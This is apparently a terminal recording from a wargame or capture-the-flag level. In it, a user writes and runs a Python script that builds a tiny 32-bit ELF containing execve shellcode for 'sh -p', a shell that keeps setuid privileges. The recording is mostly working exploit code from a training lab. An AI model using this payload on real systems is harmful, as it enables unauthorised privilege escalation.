[7.995265, "o", "echo '# Writing the tiny-ELF builder (heredoc, code visible):'\r\r\n\u001b[?2004l\r"]
[7.99583, "o", "\u001b]3008;start=ffaf13f0-b57b-48e9-87ea-dcacb15b687a;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze4;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/run/screen/l4\u001b\\# Writing the tiny-ELF builder (heredoc, code visible):\r\r\n"]
[7.999313, "o", "\u001b]3008;end=ffaf13f0-b57b-48e9-87ea-dcacb15b687a;exit=success\u001b\\\u001b]3008;start=9284f040-deb9-4973-ae57-0362f964d9cb;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze4;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/run/screen/l4\u001b\\"]
[8.002991, "o", "\u001b[?2004h\u001b]0;maze4@maze: /run/screen/l4\u0007maze4@maze:/run/screen/l4$ "]
[18.519321, "o", "cat > /run/screen/l4/tinel.py <<'PYEOF'\r\r\n\u001b[?2004l\r\u001b[?2004h> import struct, sys\r\r\n\u001b[?2004l\r\u001b[?2004h> V = 0x08048000\r\r\n\u001b[?2004l\r\u001b[?2004h> code = bytes([\r\r\n\u001b[?2004l\r\u001b[?2004h>     0x31, 0xC0,                       # xor eax, eax\r\r\n\u001b[?2004l\r\u001b[?2004h>     0x50,                             # push eax (NULL envp)\r\r\n\u001b[?2004l\r\u001b[?2004h>     0x68, 0x0C, 0x80, 0x04, 0x08,     # push \"-p\" @ 0x0804800c\r\r\n\u001b[?2004l\r\u001b[?2004h>     0x68, 0x09, 0x80, 0x04, 0x08,     # push \"sh\" @ 0x08048009\r\r\n\u001b[?2004l\r\u001b[?2004h>     0x89, 0xE1,                       # mov ecx, esp (argv)\r\r\n\u001b[?2004l\r\u001b[?2004h>     0xBB, 0x09, 0x80, 0x04, 0x08,     # mov ebx, \"sh\"\r\r\n\u001b[?2004l\r\u001b[?2004h>     0x31, 0xD2,                       # xor edx, edx\r\r\n\u001b[?2004l\r\u001b[?2004h>     0xB0, 0x0B,                       # execve\r\r\n\u001b[?2004l\r\u001b[?2004h>     0xCD, 0x80,\r\r\n\u001b[?2004l\r\u001b[?2004h> ])\r\r\n\u001b[?2004l\r\u001b[?2004h> assert len(code) == 26\r\r\n\u001b[?2004l\r\u001b[?2004h> ehdr = bytearray(52)\r\r\n\u001b[?2004l\r\u001b[?2004h> ehdr[0:8] = b\"\\x7fELF\\x01\\x01\\x01\\x00\"\r\r\n\u001b[?2004l\r\u001b[?2004h> ehdr[9:15] = b\"sh\\x00-p\\x00\"         # strings hidden in EI_PAD\r\r\n\u001b[?2004l\r\u001b[?2004h> ehdr[15] = 0\r\r\n\u001b[?2004l\r\u001b[?2004h> struct.pack_into(\"<HHIIIIIHHHHHH\", ehdr, 16,\r\r\n\u001b[?2004l\r\u001b[?2004h>                  2, 3, 1, V + 84, 52, 0, 0, 52, 32, 1, 0, 0, 0)\r\r\n\u001b[?2004l\r\u001b[?2004h> phdr = bytearray(32)\r\r\n\u001b[?2004l\r\u001b[?2004h> struct.pack_into(\"<IIIIIIII\", phdr, 0,\r\r\n\u001b[?2004l\r\u001b[?2004h>                  1, 0, V, 0, 123, 123, 5, 0x1000)\r\r\n\u001b[?2004l\r\u001b[?2004h> data = bytes(ehdr) + bytes(phdr) + code\r\r\n\u001b[?2004l\r\u001b[?2004h> data += b\"\\x00\" * (123 - len(data))\r\r\n\u001b[?2004l\r\u001b[?2004h> assert len(data) == 123\r\r\n\u001b[?2004l\r\u001b[?2004h> open(sys.argv[1], \"wb\").write(data)\r\r\n\u001b[?2004l\r\u001b[?2004h> print(\"wrote\", len(data), \"bytes\")\r\r\n\u001b[?2004l\r\u001b[?2004h> PYEOF\r\r\n\u001b[?2004l\r\u001b]3008;start=06bc2450-d118-4394-b265-12fadea115fc;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze4;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/run/screen/l4\u001b\\\u001b]3008;end=06bc2450-d118-4394-b265-12fadea115fc;exit=success\u001b\\\u001b]3008;start=9284f040-deb9-4973-ae57-0362f964d9cb;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze4;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/run/screen/l4\u001b\\\u001b[?2004h\u001b]0;maze4@maze: /run/screen/l4\u0007maze4@maze:/run/screen/l4$ "]
[18.705847, "o", "python3 /run/screen/l4/tinel.py /run/screen/l4/tiny\r\r\n\u001b[?2004l\r\u001b]3008;start=37349fdb-dd43-4fd0-8486-fa58f0cbd5fa;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze4;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/run/screen/l4\u001b\\"]
[18.738316, "o", "wrote 123 bytes\r\r\n"]
[18.742145, "o", "\u001b]3008;end=37349fdb-dd43-4fd0-8486-fa58f0cbd5fa;exit=success\u001b\\"]
